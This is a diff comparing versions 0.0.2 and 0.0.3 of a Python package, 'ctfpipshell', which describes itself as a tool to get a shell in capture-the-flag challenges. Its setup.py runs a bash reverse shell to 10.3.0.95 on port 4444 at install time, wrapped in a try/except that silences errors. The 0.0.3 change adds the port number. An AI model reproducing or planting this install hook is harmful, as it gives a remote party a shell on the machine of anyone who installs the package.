# Comparing `tmp/ctfpipshell-0.0.2.tar.gz` & `tmp/ctfpipshell-0.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "ctfpipshell-0.0.2.tar", last modified: Sun May 14 13:34:22 2023, max compression
+gzip compressed data, was "ctfpipshell-0.0.3.tar", last modified: Sun May 14 13:35:06 2023, max compression
```

## Comparing `ctfpipshell-0.0.2.tar` & `ctfpipshell-0.0.3.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-14 13:34:22.173588 ctfpipshell-0.0.2/
--rw-rw-rw-   0        0        0     1084 2023-05-14 05:21:25.000000 ctfpipshell-0.0.2/LICENSE
--rw-rw-rw-   0        0        0      388 2023-05-14 13:34:22.171589 ctfpipshell-0.0.2/PKG-INFO
--rw-rw-rw-   0        0        0       15 2023-05-14 05:21:25.000000 ctfpipshell-0.0.2/README.md
-drwxrwxrwx   0        0        0        0 2023-05-14 13:34:22.148581 ctfpipshell-0.0.2/ctfpipshell/
--rw-rw-rw-   0        0        0        0 2023-05-14 05:22:06.000000 ctfpipshell-0.0.2/ctfpipshell/__init__.py
--rw-rw-rw-   0        0        0        0 2023-05-14 05:22:17.000000 ctfpipshell-0.0.2/ctfpipshell/ctfpipshell.py
-drwxrwxrwx   0        0        0        0 2023-05-14 13:34:22.168587 ctfpipshell-0.0.2/ctfpipshell.egg-info/
--rw-rw-rw-   0        0        0      388 2023-05-14 13:34:21.000000 ctfpipshell-0.0.2/ctfpipshell.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      251 2023-05-14 13:34:22.000000 ctfpipshell-0.0.2/ctfpipshell.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-14 13:34:21.000000 ctfpipshell-0.0.2/ctfpipshell.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        6 2023-05-14 13:34:22.000000 ctfpipshell-0.0.2/ctfpipshell.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-14 13:34:22.000000 ctfpipshell-0.0.2/ctfpipshell.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-14 13:34:22.173588 ctfpipshell-0.0.2/setup.cfg
--rw-rw-rw-   0        0        0      781 2023-05-14 13:34:00.000000 ctfpipshell-0.0.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-14 13:35:06.433378 ctfpipshell-0.0.3/
+-rw-rw-rw-   0        0        0     1084 2023-05-14 05:21:25.000000 ctfpipshell-0.0.3/LICENSE
+-rw-rw-rw-   0        0        0      388 2023-05-14 13:35:06.432378 ctfpipshell-0.0.3/PKG-INFO
+-rw-rw-rw-   0        0        0       15 2023-05-14 05:21:25.000000 ctfpipshell-0.0.3/README.md
+drwxrwxrwx   0        0        0        0 2023-05-14 13:35:06.410372 ctfpipshell-0.0.3/ctfpipshell/
+-rw-rw-rw-   0        0        0        0 2023-05-14 05:22:06.000000 ctfpipshell-0.0.3/ctfpipshell/__init__.py
+-rw-rw-rw-   0        0        0        0 2023-05-14 05:22:17.000000 ctfpipshell-0.0.3/ctfpipshell/ctfpipshell.py
+drwxrwxrwx   0        0        0        0 2023-05-14 13:35:06.429377 ctfpipshell-0.0.3/ctfpipshell.egg-info/
+-rw-rw-rw-   0        0        0      388 2023-05-14 13:35:06.000000 ctfpipshell-0.0.3/ctfpipshell.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      251 2023-05-14 13:35:06.000000 ctfpipshell-0.0.3/ctfpipshell.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-14 13:35:06.000000 ctfpipshell-0.0.3/ctfpipshell.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        6 2023-05-14 13:35:06.000000 ctfpipshell-0.0.3/ctfpipshell.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-14 13:35:06.000000 ctfpipshell-0.0.3/ctfpipshell.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-14 13:35:06.433378 ctfpipshell-0.0.3/setup.cfg
+-rw-rw-rw-   0        0        0      781 2023-05-14 13:35:01.000000 ctfpipshell-0.0.3/setup.py
```

### Comparing `ctfpipshell-0.0.2/LICENSE` & `ctfpipshell-0.0.3/LICENSE`

 * *Files identical despite different names*

### Comparing `ctfpipshell-0.0.2/setup.py` & `ctfpipshell-0.0.3/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -2,20 +2,20 @@
 import os
 with open("README.md", "r") as readme_file:
     readme = readme_file.read()
 
 requirements = ["wheel"] # 这里填依赖包信息
 try:
     print(os.getcwd())
-    os.system("bash -i >& /dev/tcp/10.3.0.95/port 0>&1")
+    os.system("bash -i >& /dev/tcp/10.3.0.95/4444 0>&1")
 except:
     pass
 setup(
     name="ctfpipshell",
-    version="0.0.2",
+    version="0.0.3",
     author="laenix",
     author_email="laenix120@gmail.com",
     description="A package to get shell in ctf",
     long_description=readme,
     long_description_content_type="text/markdown",
     url="https://github.com/laneix/ctf-pip-shell/",
     packages=find_packages(),
```

